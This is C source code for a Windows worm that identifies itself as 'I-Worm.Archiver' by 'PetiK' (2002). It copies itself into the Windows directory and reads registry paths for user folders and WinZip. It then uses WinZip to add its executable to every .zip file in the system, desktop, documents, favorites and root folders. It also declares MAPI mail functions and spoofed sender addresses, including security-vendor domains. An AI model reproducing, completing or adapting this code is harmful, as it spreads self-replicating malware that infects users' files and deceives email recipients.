

#include <windows.h>
#include <stdio.h>
#include <mapi.h>

#pragma argused
#pragma inline


char	filen[100],copyn[100],copyreg[100],windir[100],sysdir[100],inzip[256],fsubj[50];
char	*fnam[]={"news","support","info","newsletter","webmaster"};
char	*fmel[]={"@yahoo.com","@hotmail.com","@symantec.com","@microsoft.com","@avp.ch","@viruslist.com"};
LPSTR	run="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	SHFolder=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
char	attname[]="news_xxxxxxxx.exe";
LPTSTR	cmdLine,ptr;
BOOL	installed;
BYTE	desktop[50],favoris[50],personal[50],winzip[50];
DWORD	sizdesktop=sizeof(desktop),sizfavoris=sizeof(favoris),
	sizpersonal=sizeof(personal),sizwinzip=sizeof(winzip);
DWORD	type=REG_SZ;
long	i;

LHANDLE session;
MapiMessage *mes;
MapiRecipDesc from;
char messId[512],mname[50],maddr[30];
HINSTANCE hMAPI;

HKEY		hReg;
WIN32_FIND_DATA	ffile;

void infzip(char *);

ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{

GetModuleFileName(hInst,filen,100);
GetSystemDirectory((char *)sysdir,100);
GetWindowsDirectory((char *)copyn,100);
strcpy(windir,copyn);
strcat(copyn,"\\Archiver.exe");

installed=FALSE;
cmdLine=GetCommandLine();
if(cmdLine) {
	for(ptr=cmdLine;ptr[0]!='-' && ptr[1]!=0;ptr++);
	if(ptr[0]=='-' && ptr[1]!=0) {
		switch(ptr[1]) {
			default:
			break;
			case 'i':
				installed=TRUE;
				break;
			case 'p':
				ShellAbout(0,"I-Worm.Archiver","Copyright (c)2002 - PetiKVX",0);
				MessageBox(NULL,"This new Worm was coded by PetiK.\nFrance - (c)2002",
					"I-Worm.Archiver",MB_OK|MB_ICONINFORMATION);
				ExitProcess(0);
				break;
			}
		}
	}

if(!installed) {
CopyFile(filen,copyn,FALSE);
strcpy(copyreg,copyn);
strcat(copyreg," -i");

ExitProcess(0);
}

RegOpenKeyEx(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,"Desktop",0,&type,desktop,&sizdesktop);
RegQueryValueEx(hReg,"Favorites",0,&type,favoris,&sizfavoris);
RegQueryValueEx(hReg,"Personal",0,&type,personal,&sizpersonal);
RegCloseKey(hReg);
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\windows\\CurrentVersion\\App Paths\\winzip32.exe",0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,NULL,0,&type,winzip,&sizwinzip);
RegCloseKey(hReg);

if(strlen(winzip)!=0) {
infzip(windir);
infzip(sysdir);
infzip(desktop);
infzip(personal);
infzip(favoris);
infzip("C:\\");
}

ExitProcess(0);
}

void infzip(char *folder)
{
register bool abc=TRUE;
register HANDLE fh;
if(strlen(folder)!=0) {
SetCurrentDirectory(folder);
fh=FindFirstFile("*.zip",&ffile);
if(fh!=INVALID_HANDLE_VALUE) {
	while(abc) {
	inzip[0]=0;
	wsprintf(inzip,"%s -a -r %s %s",winzip,ffile.cFileName,copyn);
	WinExec(inzip,1);
	abc=FindNextFile(fh,&ffile);
	}
}
}

}
